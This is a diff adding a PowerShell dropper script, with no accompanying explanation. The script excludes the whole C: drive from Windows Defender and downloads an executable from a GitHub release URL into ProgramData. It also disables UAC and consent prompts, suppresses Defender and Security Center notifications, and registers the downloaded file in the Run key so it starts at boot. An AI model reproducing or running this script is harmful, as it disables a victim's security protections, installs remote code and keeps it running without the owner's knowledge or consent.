@@ -1,0 +1,56 @@
+# Add C: drive to Windows Defender exclusions
+$defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
+if (!(Test-Path $defenderPath)) {
+    New-Item -Path $defenderPath -Force | Out-Null
+}
+$exclusionExists = Get-ItemProperty -Path $defenderPath -Name "C:\" -ErrorAction SilentlyContinue
+if (!$exclusionExists) {
+    New-ItemProperty -Path $defenderPath -Name "C:" -PropertyType String -Value "" -Force | Out-Null
+}
+
+# Download and execute file
+$filePath1 = "C:\ProgramData\SOMEEXENAME.exe"
+$url1 = "https://github.com/alexandrahollenbeck1929-star/test/releases/download/hihi/WindowsService.exe"
+if (!(Test-Path $filePath1)) {
+    Remove-Item -Path $filePath1 -Force -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri $url1 -UseBasicParsing -OutFile $filePath1
+}
+
+# Disable UAC
+$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+$uacValue = Get-ItemProperty -Path $uacPath -Name "EnableLUA" -ErrorAction SilentlyContinue
+if ($uacValue.EnableLUA -ne 0) {
+    Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
+}
+$notifyValue = Get-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -ErrorAction SilentlyContinue
+if ($notifyValue.ConsentPromptBehaviorAdmin -ne 0) {
+    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
+}
+
+# Disable Windows Defender notifications
+$defenderNotifyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"
+if (!(Test-Path $defenderNotifyPath)) {
+    New-Item -Path $defenderNotifyPath -Force -ErrorAction SilentlyContinue | Out-Null
+}
+Set-ItemProperty -Path $defenderNotifyPath -Name "Notification_Suppress" -Value 1 -Force -ErrorAction SilentlyContinue
+
+$defenderReportingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting"
+if (!(Test-Path $defenderReportingPath)) {
+    New-Item -Path $defenderReportingPath -Force -ErrorAction SilentlyContinue | Out-Null
+}
+Set-ItemProperty -Path $defenderReportingPath -Name "DisableEnhancedNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+
+# Disable Security Center notifications
+$securityCenterPath = "HKLM:\SOFTWARE\Microsoft\Security Center\Svc"
+if (Test-Path $securityCenterPath) {
+    Set-ItemProperty -Path $securityCenterPath -Name "AntiVirusDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $securityCenterPath -Name "FirewallDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $securityCenterPath -Name "UpdatesDisableNotify" -Value 1 -Force -ErrorAction SilentlyContinue
+}
+
+# Add to startup
+$runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+$runEntryExists = Get-ItemProperty -Path $runKey -Name "SOMENAME" -ErrorAction SilentlyContinue
+if (!$runEntryExists) {
+    New-ItemProperty -Path $runKey -Name "SOMENAME" -PropertyType String -Value $filePath1 -Force | Out-Null
+}
